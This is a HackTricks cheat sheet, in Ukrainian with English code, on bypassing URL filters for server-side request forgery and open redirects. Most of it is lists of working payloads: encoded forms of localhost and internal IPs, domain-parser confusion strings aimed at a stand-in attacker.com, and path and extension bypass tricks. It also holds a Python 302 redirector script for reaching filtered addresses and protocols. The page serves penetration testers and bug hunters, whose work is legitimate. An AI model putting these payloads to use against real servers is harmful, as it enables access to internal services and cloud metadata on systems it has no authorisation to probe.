# URL Format Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### –õ–æ–∫–∞–ª—å–Ω–∏–π —Ö–æ—Å—Ç
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://‚ë†‚ë°‚ë¶.‚ì™.‚ì™.‚ì™

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127„ÄÇ0„ÄÇ0„ÄÇ1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
![](<../../.gitbook/assets/image (776).png>)

–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è **Burp** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) —Ä–µ–∞–ª—ñ–∑—É—î –æ–±—Ö—ñ–¥ —Ñ–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è IP.

### –ü–∞—Ä—Å–µ—Ä –¥–æ–º–µ–Ω—ñ–≤
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker„ÄÇcom
‚í∂‚ìâ‚ìâ‚í∂‚í∏‚ìÄ‚í∫‚ì°.‚í∏‚ìû‚ìú
```

```
‚ë† ‚ë° ‚ë¢ ‚ë£ ‚ë§ ‚ë• ‚ë¶ ‚ëß ‚ë® ‚ë© ‚ë™ ‚ë´ ‚ë¨ ‚ë≠ ‚ëÆ ‚ëØ ‚ë∞ ‚ë± ‚ë≤ ‚ë≥ ‚ë¥ ‚ëµ ‚ë∂ ‚ë∑ ‚ë∏ ‚ëπ ‚ë∫ ‚ëª ‚ëº ‚ëΩ ‚ëæ
‚ëø ‚íÄ ‚íÅ ‚íÇ ‚íÉ ‚íÑ ‚íÖ ‚íÜ ‚íá ‚íà ‚íâ ‚íä ‚íã ‚íå ‚íç ‚íé ‚íè ‚íê ‚íë ‚íí ‚íì ‚íî ‚íï ‚íñ ‚íó
‚íò ‚íô ‚íö ‚íõ ‚íú ‚íù ‚íû ‚íü ‚í† ‚í° ‚í¢ ‚í£ ‚í§ ‚í• ‚í¶ ‚íß ‚í® ‚í© ‚í™ ‚í´ ‚í¨ ‚í≠ ‚íÆ ‚íØ ‚í∞
‚í± ‚í≤ ‚í≥ ‚í¥ ‚íµ ‚í∂ ‚í∑ ‚í∏ ‚íπ ‚í∫ ‚íª ‚íº ‚íΩ ‚íæ ‚íø ‚ìÄ ‚ìÅ ‚ìÇ ‚ìÉ ‚ìÑ ‚ìÖ ‚ìÜ ‚ìá ‚ìà ‚ìâ
‚ìä ‚ìã ‚ìå ‚ìç ‚ìé ‚ìè ‚ìê ‚ìë ‚ìí ‚ìì ‚ìî ‚ìï ‚ìñ ‚ìó ‚ìò ‚ìô ‚ìö ‚ìõ ‚ìú ‚ìù ‚ìû ‚ìü ‚ì† ‚ì° ‚ì¢
‚ì£ ‚ì§ ‚ì• ‚ì¶ ‚ìß ‚ì® ‚ì© ‚ì™ ‚ì´ ‚ì¨ ‚ì≠ ‚ìÆ ‚ìØ ‚ì∞ ‚ì± ‚ì≤ ‚ì≥ ‚ì¥ ‚ìµ ‚ì∂ ‚ì∑ ‚ì∏ ‚ìπ ‚ì∫ ‚ìª ‚ìº ‚ìΩ ‚ìæ ‚ìø
```
### –ü–ª—É—Ç–∞–Ω–∏–Ω–∞ –¥–æ–º–µ–Ω—ñ–≤
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### –û–±—Ö—ñ–¥ —à–ª—è—Ö—ñ–≤ —Ç–∞ —Ä–æ–∑—à–∏—Ä–µ–Ω—å

–Ø–∫—â–æ –≤–∏–º–∞–≥–∞—î—Ç—å—Å—è, —â–æ–± URL –∑–∞–∫—ñ–Ω—á—É–≤–∞–≤—Å—è —à–ª—è—Ö–æ–º –∞–±–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º, –∞–±–æ –ø–æ–≤–∏–Ω–µ–Ω –º—ñ—Å—Ç–∏—Ç–∏ —à–ª—è—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ–¥–∏–Ω –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –æ–±—Ö–æ–¥—ñ–≤:
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

The tool [**recollapse**](https://github.com/0xacb/recollapse) can generate variations from a given input to try to bypass the used regex. Check [**this post**](https://0xacb.com/2022/11/21/recollapse/) also for more information.

### Bypass via redirect

–ú–æ–∂–ª–∏–≤–æ, —â–æ —Å–µ—Ä–≤–µ—Ä **—Ñ—ñ–ª—å—Ç—Ä—É—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç** SSRF **–∞–ª–µ –Ω–µ** –º–æ–∂–ª–∏–≤—É **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—É** –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ —Ü–µ–π –∑–∞–ø–∏—Ç.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–µ—Ä–≤–µ—Ä, –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ SSRF —á–µ—Ä–µ–∑: `url=https://www.google.com/`, –º–æ–∂–µ **—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä url**. –ê–ª–µ —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ [python —Å–µ—Ä–≤–µ—Ä –¥–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ 302](https://pastebin.com/raw/ywAUhFrv) –Ω–∞ –º—ñ—Å—Ü–µ, –∫—É–¥–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–¥–æ—Å—Ç—É–ø –¥–æ –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å** —Ç–∞–∫–∏—Ö —è–∫ 127.0.0.1 –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏—Ö **–ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤** —Ç–∞–∫–∏—Ö —è–∫ gopher.\
[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## –ü–æ—è—Å–Ω–µ–Ω—ñ —Ç—Ä—é–∫–∏

### –¢—Ä—é–∫ –∑ –∑–≤–æ—Ä–æ—Ç–Ω–∏–º —Å–ª–µ—à–µ–º

_–¢—Ä—é–∫ –∑ –∑–≤–æ—Ä–æ—Ç–Ω–∏–º —Å–ª–µ—à–µ–º_ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ä—ñ–∑–Ω–∏—Ü—é –º—ñ–∂ [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) —Ç–∞ [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). –•–æ—á–∞ RFC3986 —î –∑–∞–≥–∞–ª—å–Ω–æ—é –æ—Å–Ω–æ–≤–æ—é –¥–ª—è URI, WHATWG —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–π –¥–ª—è –≤–µ–±-URL —ñ –ø—Ä–∏–π–Ω—è—Ç–∏–π —Å—É—á–∞—Å–Ω–∏–º–∏ –±—Ä–∞—É–∑–µ—Ä–∞–º–∏. –ö–ª—é—á–æ–≤–∞ –≤—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç WHATWG –≤–∏–∑–Ω–∞—î –∑–≤–æ—Ä–æ—Ç–Ω–∏–π —Å–ª–µ—à (`\`) –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–æ–º –ø—Ä—è–º–æ–≥–æ —Å–ª–µ—à–∞ (`/`), —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ç–µ, —è–∫ URL-–∞–¥—Ä–µ—Å–∏ —Ä–æ–∑–±–∏—Ä–∞—é—Ç—å—Å—è, –∑–æ–∫—Ä–µ–º–∞, –ø–æ–∑–Ω–∞—á–∞—é—á–∏ –ø–µ—Ä–µ—Ö—ñ–¥ –≤—ñ–¥ —ñ–º–µ–Ω—ñ —Ö–æ—Å—Ç–∞ –¥–æ —à–ª—è—Ö—É –≤ URL.

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### –Ü–Ω—à—ñ –Ω–µ–ø–æ—Ä–æ–∑—É–º—ñ–Ω–Ω—è

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../.gitbook/assets/image (600).png>)

–∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑ [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)


{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ç—Ä—é–∫–∞–º–∏ –∑ —Ö–∞–∫—ñ–Ω–≥—É, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
